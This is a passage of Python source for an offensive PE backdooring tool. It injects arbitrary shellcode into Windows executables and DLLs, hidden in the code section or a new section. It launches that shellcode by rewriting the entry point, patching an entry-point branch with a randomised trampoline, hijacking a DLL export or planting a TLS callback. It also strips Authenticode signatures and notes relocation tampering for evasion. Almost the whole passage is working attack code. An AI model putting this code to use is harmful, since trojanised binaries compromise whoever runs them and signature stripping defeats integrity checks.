            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):

            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment

            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                        self.pe.sections[-1].VirtualAddress)
                or  VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                        (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize < len(Data):
                VirtualSize = len(Data)

            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += b'\x00' * (FileAlignment - (len(Data) % FileAlignment))

            if RawSize != len(Data):
                if (    RawSize > len(Data)
                    and (RawSize % FileAlignment) == 0):
                    Data += b'\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)

            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                        section_table_offset + (self.pe.FILE_HEADER.NumberOfSections+1)*0x28
                or not self.__is_null_data(self.pe.get_data(section_table_offset +
                        (self.pe.FILE_HEADER.NumberOfSections)*0x28, 0x28))):

                Logger.dbg(f'Checking if more space can be added to PE headers: {self.pe.OPTIONAL_HEADER.SizeOfHeaders} < {self.pe.sections[0].VirtualAddress}?')

                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:

                    self.__add_header_space()
                    Logger.dbg("Additional space to add a new section header was allocated.")
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                                    self.pe.sections[-1].SizeOfRawData)):
                    RawAddress =     \
                        (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
                                    self.pe.__data__[RawAddress:])

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset+0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset+0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset+0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset+0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset+0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset+0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset+0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset+0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset+0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections +=1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " +
                "size of the sections list of pefile don't match ({} != {})".format(
                self.pe.FILE_HEADER.NumberOfSections, len(self.pe.sections)
                ))

        return self.pe

def hexdump(data, addr = 0, num = 0):
    s = ''
    n = 0
    lines = []
    if num == 0: num = len(data)

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (addr + i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % (data[j] & 0xff)

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)
    return '\n'.join(lines)

class PeBackdoor:
    IMAGE_DIRECTORY_ENTRY_SECURITY = 4
    IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
    IMAGE_DIRECTORY_ENTRY_TLS = 9

    IMAGE_REL_BASED_ABSOLUTE              = 0
    IMAGE_REL_BASED_HIGH                  = 1
    IMAGE_REL_BASED_LOW                   = 2
    IMAGE_REL_BASED_HIGHLOW               = 3
    IMAGE_REL_BASED_HIGHADJ               = 4
    IMAGE_REL_BASED_DIR64                 = 10

    class SupportedSaveModes(IntEnum):
        WithinCodeSection   = 1
        NewPESection        = 2

    class SupportedRunModes(IntEnum):
        ModifyOEP           = 1
        BackdoorEP          = 2
        TLSCallback         = 3
        HijackExport        = 4

    availableSaveModes = {
        SupportedSaveModes.WithinCodeSection:   'store shellcode in the middle of code section',
        SupportedSaveModes.NewPESection:        'append shellcode to the PE file in a new PE section',
    }

    availableRunModes = {
        SupportedRunModes.ModifyOEP:    'change AddressOfEntryPoint',
        SupportedRunModes.TLSCallback:  'setup TLS callback',
        SupportedRunModes.BackdoorEP:   'modify first branching instruction from Original Entry Point',
    }

    def __init__(self, options, logger):
        self.options = options
        self.pe = None
        self.logger = logger
        self.createdTlsSection = False

    def openFile(self):
        self.pe = pefile.PE(self.infile, fast_load=False)
        self.pe.parse_data_directories()

        self.ptrSize = 4
        self.arch = self.getFileArch()
        if self.arch == 'x64':
            self.ptrSize = 8

    def getFileArch(self):
        if self.pe.FILE_HEADER.Machine == 0x014c:
            return "x86"

        if self.pe.FILE_HEADER.Machine == 0x8664:
            return "x64"

        raise Exception("Unsupported PE file architecture.")

    def backdoor(self, saveMode, runMode, shellcode, infile, outfile):
        self.saveMode = saveMode
        self.runMode = runMode
        self.shellcode = shellcode
        self.infile = infile
        self.outfile = outfile
        self.sectionName = options.get('section_name', DefaultSectionName)
        self.shellcodeOffset = 0

        try:
            PeBackdoor.SupportedSaveModes(saveMode)
        except:
            self.logger.fatal(f'Unsupported save mode specified. Please see help message for a list of available save,run modes.')

        try:
            PeBackdoor.SupportedRunModes(runMode)
        except:
            self.logger.fatal(f'Unsupported run mode specified. Please see help message for a list of available save,run modes.')

        try:
            with open(self.shellcode, 'rb') as f:
                self.shellcodeData = f.read()

            if len(self.options['ioc']) > 0:
                self.shellcodeData += b'\x00\x00\x00\x00' + self.options['ioc'].encode() + b'\x00\x00\x00\x00'

            self.openFile()

            if not self.injectShellcode():
                self.logger.err('Could not inject shellcode into PE file!')
                return False

            if not self.setupShellcodeEntryPoint():
                self.logger.err('Could not setup shellcode launch within PE file!')
                return False

            remainingRelocsSize = self.getRemainingRelocsDirectorySize()
            numOfRelocs = int((remainingRelocsSize - 8) / 2)
            self.logger.dbg(f'Still can add up to {numOfRelocs} relocs tampering with shellcode for evasion purposes.')

            if self.options['remove_signature']:
                self.removeSignature()

            self.logger.dbg('Saving modified PE file...')
            self.pe.write(self.outfile)

            return True

        except pefile.PEFormatError:
            self.logger.warn('Input file is not a valid PE file.')
            return False

        except Exception as e:
            raise

        finally:
            self.pe.close()

    def removeSignature(self):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress
        size = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size

        self.pe.set_bytes_at_rva(addr, b'\x00' * size)

        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress = 0
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_SECURITY].Size = 0

        self.logger.ok('PE executable Authenticode signature removed.')
        return True

    def injectShellcode(self):
        if self.saveMode == int(PeBackdoor.SupportedSaveModes.NewPESection):
            self.pe.write(self.outfile)
            self.pe.close()

            out = self.addNewPESection(self.outfile, self.sectionName, self.shellcodeData)

            with open(self.outfile, 'rb') as f:
                self.pe = pefile.PE(data = f.read(), fast_load = False)

            offset = self.pe.sections[-1].PointerToRawData
            self.shellcodeOffset = offset

            rva = self.pe.get_rva_from_offset(offset)

            self.logger.ok(f'Shellcode injected into a new PE section {self.sectionName} at RVA 0x{rva:x}')
            return True

        elif self.saveMode == int(PeBackdoor.SupportedSaveModes.WithinCodeSection):
            for sect in self.pe.sections:
                name = sect.Name.decode()
                self.logger.dbg(f'Checking if section is executable: {name}')

                if sect.Characteristics & 0x20 != 0:
                    self.logger.dbg(f'Backdooring {name} section.')

                    if sect.Misc_VirtualSize < len(self.shellcodeData):
                        self.logger.fatal(f'''Input shellcode is too large to fit into target PE executable code section!
    Shellcode size    : {len(self.shellcodeData)}
    Code section size : {sect.Misc_VirtualSize}
''')

                    offset = int((sect.Misc_VirtualSize - len(self.shellcodeData)) / 2)
                    self.logger.dbg(f'Inserting shellcode into 0x{offset:x} offset.')

                    self.pe.set_bytes_at_offset(offset, self.shellcodeData)
                    self.shellcodeOffset = offset

                    rva = self.pe.get_rva_from_offset(offset)

                    p = sect.PointerToRawData + sect.SizeOfRawData - 64
                    graph = textwrap.indent(f'''
Beginning of {name}:
{textwrap.indent(hexdump(self.pe.get_data(sect.VirtualAddress), sect.VirtualAddress, 64), "0")}

Injected shellcode in the middle of {name}:
{hexdump(self.shellcodeData, offset, 64)}

Trailing {name} bytes:
{hexdump(self.pe.get_data(self.pe.get_rva_from_offset(p)), p, 64)}
''', '\t')

                    self.logger.ok(f'Shellcode injected into existing code section at RVA 0x{rva:x}')
                    self.logger.dbg(graph)
                    return True

        return False

    def setupShellcodeEntryPoint(self):
        if self.runMode == int(PeBackdoor.SupportedRunModes.ModifyOEP):
            rva = self.pe.get_rva_from_offset(self.shellcodeOffset)
            self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = rva

            self.logger.ok(f'Address Of Entry Point changed to: RVA 0x{rva:x}')
            return True

        elif self.runMode == int(PeBackdoor.SupportedRunModes.TLSCallback):
            self.logger.err(f'''
======================================================================================================
   WARNING! TLS Callback technique IS UNSTABLE
======================================================================================================

However TLS Callback shellcode execution might seem fancy, in practice it's not very useful from offensive perspective.
Beware: Even the simplest WinExec("notepad.exe") shellcode might not work!

The reason is that Windows Image Loader first calls out to TLS Callbacks before initializing loaded DLLs (calling DllMain)
which induces typical Loader Lock problems similar to running complex operations from inside of a DllMain.

This means, that however we'll setup TLS callback (and related structures) correctly, complex shellcode depending on
loaded DLLs probably won't work - resulting in mysterious crashes, deadlocks, freezes etc.

Quote [1]:
    "One interesting fact about TLS initializers is that they are always called before DLL initializers for their
    corresponding DLL. (The process occurs in sequence, such that DLL A’s TLS and DLL initializers are called, then
    DLL B’s TLS and DLL initializers, and so forth.) This means that TLS initializers need to be careful about making,
    say, CRT calls (as the C runtime is initialized before the user’s DllMain routine is called, by the actual DLL
    initializer entrypoint, such that the CRT will not be initialized when a TLS initializer for the module is invoked).
    This can be dangerous, as global objects will not have been constructed yet; the module will be in a completely uninitialized state"

Sources:
  [1] http://www.nynaeve.net/?p=186
  [2] http://www.nynaeve.net/?p=187

======================================================================================================
''')
            return self.injectTls()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.BackdoorEP):
            return self.backdoorEntryPoint()

        elif self.runMode == int(PeBackdoor.SupportedRunModes.HijackExport):
            addr = self.getExportEntryPoint()
            if addr == -1:
                self.logger.fatal('Could not find any export entry point to hijack! Specify existing DLL Exported function with -e/--export!')

            return self.backdoorEntryPoint(addr)

        return False

    def getExportEntryPoint(self):
        dec = lambda x: '???' if x is None else x.decode()

        exportName = self.options.get('export', '')
        if len(exportName) == 0:
            self.logger.fatal('Export name not specified! Specify DLL Exported function name to hijack with -e/--export')

        d = [pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
        self.pe.parse_data_directories(directories=d)

        if self.pe.DIRECTORY_ENTRY_EXPORT.symbols == 0:
            self.logger.err('No DLL exports found! Specify existing DLL Exported function with -e/--export!')
            return -1

        exports = [(e.ordinal, dec(e.name)) for e in self.pe.DIRECTORY_ENTRY_EXPORT.symbols]

        for export in exports:
            self.logger.dbg(f'DLL Export: {export[0]} {export[1]}')
            if export[1].lower() == exportName.lower():

                addr = self.pe.DIRECTORY_ENTRY_EXPORT.symbols[export[0]-1].address
                self.logger.ok(f'Found DLL Export "{exportName}" at RVA 0x{addr:x} . Attempting to hijack it...')
                return addr

        return -1

    def backdoorEntryPoint(self, addr = -1):
        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
        self.shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        cs = None
        ks = None

        if self.arch == 'x86':
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_32 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32 + keystone.KS_MODE_LITTLE_ENDIAN)
        else:
            cs = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64 + capstone.CS_MODE_LITTLE_ENDIAN)
            ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64 + keystone.KS_MODE_LITTLE_ENDIAN)

        cs.detail = True

        ep = addr

        if addr == -1:
            ep = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint

        ep_ava = ep + self.pe.OPTIONAL_HEADER.ImageBase

        data = self.pe.get_memory_mapped_image()[ep:ep+128]
        offset = 0

        self.logger.dbg(f'Entry Point disasm (VA: 0x{ep_ava:08x} / RVA: 0x{ep:08x}):')

        disasmData = self.pe.get_memory_mapped_image()
        output = self.disasmBytes(cs, ks, disasmData, ep, 128, self.backdoorInstruction)

        if output != 0:
            self.logger.dbg('Now disasm looks like follows: ')

            disasmData = self.pe.get_memory_mapped_image()
            self.disasmBytes(cs, ks, disasmData, output - 32, 32, None, maxDepth = 3)

            self.logger.dbg('\n[>] Inserted backdoor code: ')
            for instr in cs.disasm(bytes(self.compiledTrampoline), output):
                self._printInstr(instr, 1)

            self.logger.dbg('')
            self.disasmBytes(cs, ks, disasmData, output + len(self.compiledTrampoline), 32, None, maxDepth = 3)

        else:
            self.logger.err('Did not find suitable candidate for Entry Point branch hijack!')

        return output

    def getBackdoorTrampoline(self, cs, ks, instr):
        trampoline = ''
        addrOffset = -1

        registers = ['rax', 'rbx', 'rcx', 'rdx', 'rsi', 'rdi']

        if self.arch == 'x86':
            registers = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']

        reg = random.choice(registers).upper()
        reg2 = random.choice(registers).upper()

        while reg2 == reg:
            reg2 = random.choice(registers).upper()

        enc, count = ks.asm(f'MOV {reg}, 0x{self.shellcodeAddr:x}')
        for instr2 in cs.disasm(bytes(enc), 0):
            addrOffset = len(instr2.bytes) - instr2.addr_size
            break

        found = instr.mnemonic.lower() in ['jmp', 'je', 'jz', 'jne', 'jnz', 'ja', 'jb', 'jae', 'jbe', 'jg', 'jl', 'jge', 'jle']
        found |= instr.mnemonic.lower() == 'call'

        if found:
            self.logger.info(f'Backdooring entry point {instr.mnemonic.upper()} instruction at 0x{instr.address:x} into:')

            jump = random.choice([
                f'CALL {reg}',

                #
                # During my tests I found that CALL reg works stabily all the time, whereas below two gadgets
                # are known to crash on seldom occassions.
                #

                #f'JMP {reg}',
                #f'PUSH {reg} ; RET',
            ])

            trampoline = f'MOV {reg}, 0x{self.shellcodeAddr:x} ; {jump}'

        for ins in trampoline.split(';'):
            self.logger.info(f'\t{ins.strip()}')

        self.logger.info('')

        return (trampoline, addrOffset)

    def backdoorInstruction(self, cs, ks, disasmData, startOffset, instr, operand, depth):
        encoding = b''
        count = 0

        if depth < 2:
            return 0

        (trampoline, addrOffset) = self.getBackdoorTrampoline(cs, ks, instr)

        if len(trampoline) > 0:
            encoding, count = ks.asm(trampoline)
            self.pe.set_bytes_at_rva(instr.address, bytes(encoding))

            relocs = (
                instr.address + addrOffset,
            )

            pageRva = 4096 * int((instr.address + addrOffset) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

            self.trampoline = trampoline
            self.compiledTrampoline = encoding
            self.compiledTrampolineCount = count

            self.logger.ok('Successfully backdoored entry point with jump/call to shellcode.\n')
            return instr.address

        return 0

    def disasmBytes(self, cs, ks, disasmData, startOffset, length, callback = None, maxDepth = 5):
        return self._disasmBytes(cs, ks, disasmData, startOffset, length, callback, maxDepth, 1)

    def _printInstr(self, instr, depth):
        _bytes = [f'{x:02x}' for x in instr.bytes[:8]]
        if len(instr.bytes) < 8:
            _bytes.extend(['  ',] * (8 - len(instr.bytes)))

        instrBytes = ' '.join([f'{x}' for x in _bytes])
        self.logger.dbg('\t' * 1 + f'[{instr.address:08x}]\t{instrBytes}' + '\t' * depth + f'{instr.mnemonic}\t{instr.op_str}')


    def _disasmBytes(self, cs, ks, disasmData, startOffset, length, callback, maxDepth, depth):
        if depth > maxDepth:
            return 0

        data = disasmData[startOffset:startOffset + length]

        for instr in cs.disasm(data, startOffset):
            self._printInstr(instr, depth)

            if len(instr.operands) == 1:
                operand = instr.operands[0]

                if operand.type == capstone.CS_OP_IMM:
                    self.logger.dbg('\t' * (depth+1) + f' -> OP_IMM: 0x{operand.value.imm:x}')
                    self.logger.dbg('')

                    if callback:
                        out = callback(cs, ks, disasmData, startOffset, instr, operand, depth)
                        if out != 0:
                            return out

                    if depth + 1 <= maxDepth:
                        out = self._disasmBytes(cs, ks, disasmData, operand.value.imm, length, callback, maxDepth, depth + 1)
                        return out

        if not callback:
            return 1

        return 0

    def addImageBaseRelocations(self, pageRva, relocs):
        relocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            relocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        if not self.pe.has_relocs():
            self.createBaseReloc(pageRva, relocs)

        else:
            self.addRelocs(pageRva, relocs)

    def getSectionIndexByName(self, name):
        i = 0
        for sect in self.pe.sections:
            if sect.Name.decode().lower().startswith(name.lower()):
                return i
            i += 1

        self.logger.err(f'Could not find section with name {name}!')
        return -1

    def getSectionIndexByDataDir(self, dirIndex):
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[dirIndex].VirtualAddress

        i = 0
        for sect in self.pe.sections:
            if addr >= sect.VirtualAddress and addr < (sect.VirtualAddress + sect.Misc_VirtualSize):
                return i
            i += 1

        self.logger.err(f'Could not find section with directory index {dirIndex}!')
        return -1

    def getRemainingRelocsDirectorySize(self):
        if self.createdTlsSection:
            return 0x1000

        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)

        out = self.pe.sections[relocsIndex].SizeOfRawData - self.pe.sections[relocsIndex].Misc_VirtualSize
        return out

    def createBaseReloc(self, pageRva, relocs):
        assert pageRva > 0

        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        self.logger.info('Input PE file does not have relocations table. Creating one...')

        sizeOfReloc = 2 * len(relocs) + 2 * 4

        self.pe.write(self.outfile)
        self.pe.close()

        out = self.addNewPESection(self.outfile, '.reloc', b'\0' * sizeOfReloc, characteristics = 0x42000040)

        with open(self.outfile, 'rb') as f:
            self.pe = pefile.PE(data = f.read(), fast_load = False)
            self.pe.parse_data_directories()

        relocDirRva = self.pe.sections[-1].VirtualAddress
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = relocDirRva
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = sizeOfReloc

        self.pe.parse_data_directories(directories = [PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC, ])

        # VirtualAddress
        self.pe.set_dword_at_rva(relocDirRva, pageRva)

        # SizeOfBlock
        self.pe.set_dword_at_rva(relocDirRva + 4, sizeOfReloc)

        self.logger.dbg(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')

        i = 0
        for reloc in relocs:
            reloc_offset = (reloc - pageRva)
            reloc_type = imageBaseRelocType << 12

            relocWord = (reloc_type | reloc_offset)
            self.pe.set_word_at_rva(relocDirRva + sizeOfReloc + 8 + i * 2, relocWord)
            self.logger.dbg(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
            i += 1

        self.createdTlsSection = True

    def addRelocs(self, pageRva, relocs):
        assert pageRva > 0

        imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_HIGHLOW

        if self.arch == 'x64':
            imageBaseRelocType = PeBackdoor.IMAGE_REL_BASED_DIR64

        self.logger.info('Adding new relocations to backdoored PE file...')

        relocsSize = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size
        relocsIndex = self.getSectionIndexByDataDir(PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC)
        addr = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        sizeOfReloc = 2 * len(relocs) + 2 * 4

        if sizeOfReloc >= self.getRemainingRelocsDirectorySize():
            self.logger.warn('WARNING! Cannot add any more relocations to this file. Probably TLS Callback execution technique wont work.')
            self.logger.warn('         Will try disabling relocations on output file. Expect corrupted executable though!')

            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0
            return

        relocDirRva = self.pe.sections[relocsIndex].VirtualAddress
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_BASERELOC].Size += sizeOfReloc

        # VirtualAddress
        self.pe.set_dword_at_rva(addr + relocsSize, pageRva)

        # SizeOfBlock
        self.pe.set_dword_at_rva(addr + relocsSize + 4, sizeOfReloc)

        self.logger.dbg(f'Adding {len(relocs)} relocations for Page RVA 0x{pageRva:x} - size of block: 0x{sizeOfReloc:x}')

        i = 0
        for reloc in relocs:
            reloc_offset = (reloc - pageRva)
            reloc_type = imageBaseRelocType << 12

            relocWord = (reloc_type | reloc_offset)
            self.pe.set_word_at_rva(relocDirRva + relocsSize + 8 + i * 2, relocWord)
            self.logger.dbg(f'\tReloc{i} for addr 0x{reloc:x}: 0x{relocWord:x} - 0x{reloc_offset:x} - type: {imageBaseRelocType}')
            i += 1

    def findCave(self, section, size, skip = 0):
        dataSect = section.get_data()

        num = len(dataSect) - size
        found = 0
        while num > 0:
            subsect = dataSect[num : num + size]
            if all(v == 0 for v in subsect):
                found += 1
                if skip == 0:
                    return num + section.VirtualAddress

                elif skip > 0 and found > skip:
                    return num + section.VirtualAddress

            num -= self.ptrSize

        self.logger.fatal(f'Could not find suitable code/data cave in section {section.Name.decode().strip()}!')
        return -1

    def injectTls(self):
        rdataIndex = -1
        dataIndex = -1
        imageBase = self.pe.OPTIONAL_HEADER.ImageBase
        shellcodeAddr = self.pe.get_rva_from_offset(self.shellcodeOffset) + imageBase

        tlsDirRva = 0

        if not hasattr(self.pe, 'DIRECTORY_ENTRY_TLS'):

            sizeOfTls = 4 * self.ptrSize + 2 * 4
            sizeOfTotalTls = sizeOfTls + 2 * self.ptrSize

            self.logger.info('Input PE file does not have TLS directory. Creating one...')

            rdataIndex = self.getSectionIndexByName(".rdata")
            if rdataIndex == -1:
                #
                # IMAGE_TLS_DIRECTORY should reside in .rdata section.
                #

                self.logger.dbg('Creating .rdata section to fit TLS directory structure...')
                self.pe.write(self.outfile)
                self.pe.close()

                out = self.addNewPESection(self.outfile, '.rdata', b'\0' * sizeOfTotalTls, characteristics = 0x40000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()
            else:
                self.logger.dbg('Adding TLS directory structure to .rdata...')

            dataIndex = self.getSectionIndexByName(".data")
            if dataIndex == -1:
                #
                # IMAGE_TLS_DIRECTORY AddressOfIndex should reside in .data section.
                #

                self.logger.dbg('Creating .data section to fit TLS Index variable...')
                self.pe.write(self.outfile)
                self.pe.close()

                out = self.addNewPESection(self.outfile, '.data', b'\0' * sizeOfTotalTls, characteristics = 0xC0000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()
            else:
                self.logger.dbg('Setting TLS AddressOfIndex to .data...')

            if rdataIndex == -1 or dataIndex == -1:
                self.logger.dbg('Creating .tls section to fit TLS directory structure...')
                self.pe.write(self.outfile)
                self.pe.close()

                sizeOfTotalTls = sizeOfTls + 6 * self.ptrSize

                out = self.addNewPESection(self.outfile, '.tls', b'\0' * sizeOfTotalTls, characteristics = 0xC0000040)

                with open(self.outfile, 'rb') as f:
                    self.pe = pefile.PE(data = f.read(), fast_load = False)
                    self.pe.parse_data_directories()

                rawDataPos  = self.pe.sections[-1].VirtualAddress
                dataSectPos = self.pe.sections[-1].VirtualAddress + 1 * self.ptrSize
                tlsDirRva   = self.pe.sections[-1].VirtualAddress + 3 * self.ptrSize

            else:
                rawDataPos = self.findCave(self.pe.sections[rdataIndex], self.ptrSize, 0)
                dataSectPos = self.findCave(self.pe.sections[dataIndex], 2 * self.ptrSize, 0)
                tlsDirRva = self.findCave(self.pe.sections[rdataIndex], sizeOfTotalTls, 1)

                self.pe.set_bytes_at_rva(rawDataPos, b'\0' * 1 * self.ptrSize)
                self.pe.set_bytes_at_rva(dataSectPos, b'\0' * 2 * self.ptrSize)
                self.pe.set_bytes_at_rva(tlsDirRva, b'\0' * sizeOfTotalTls)

            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = tlsDirRva
            self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].Size = sizeOfTls

            StartAddressOfRawData   = imageBase + rawDataPos
            EndAddressOfRawData     = imageBase + rawDataPos + 1
            AddressOfIndex          = imageBase + dataSectPos
            AddressOfCallBacks      = imageBase + tlsDirRva + sizeOfTls

            relocs = (
                tlsDirRva + 0 * self.ptrSize,
                tlsDirRva + 1 * self.ptrSize,
                tlsDirRva + 2 * self.ptrSize,
                tlsDirRva + 3 * self.ptrSize,
                AddressOfCallBacks - imageBase,
            )

            pageRva = 4096 * int((AddressOfCallBacks - imageBase) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

            self.pe.parse_data_directories(directories = [PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS, ])
            self.pe.DIRECTORY_ENTRY_TLS.struct.StartAddressOfRawData = StartAddressOfRawData
            self.pe.DIRECTORY_ENTRY_TLS.struct.EndAddressOfRawData = EndAddressOfRawData
            self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex = AddressOfIndex
            self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks = AddressOfCallBacks
            self.pe.DIRECTORY_ENTRY_TLS.struct.SizeOfZeroFill = 0
            self.pe.DIRECTORY_ENTRY_TLS.struct.Characteristics = 0x100000

            if self.arch == 'x64':
                self.pe.set_qword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex - imageBase, 0)

            else:
                self.pe.set_dword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfIndex - imageBase, 0)

            self.logger.dbg('Adding ImageBase relocation to created AddressOfIndex and AddressOfCallBacks fields.')

        elif self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress != 0:
            self.logger.info('Input file already has TLS directory entry. Will backdoor it.')
            tlsDirRva = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[PeBackdoor.IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress

            relocs = (
                self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase,
            )

            pageRva = 4096 * int((self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase) / 4096)
            self.addImageBaseRelocations(pageRva, relocs)

        else:
            self.logger.fatal('Could not detect TLS structure presence!')

        if self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks != 0:
            if self.arch == 'x64':
                self.pe.set_qword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase, shellcodeAddr)

            else:
                self.pe.set_dword_at_rva(self.pe.DIRECTORY_ENTRY_TLS.struct.AddressOfCallBacks - imageBase, shellcodeAddr)

        tls_struct = self.pe.DIRECTORY_ENTRY_TLS.struct.__pack__()
        self.pe.set_bytes_at_offset(tlsDirRva, tls_struct)

        self.logger.ok('Shellcode will launch from an injected TLS Callback')
        return True


    #
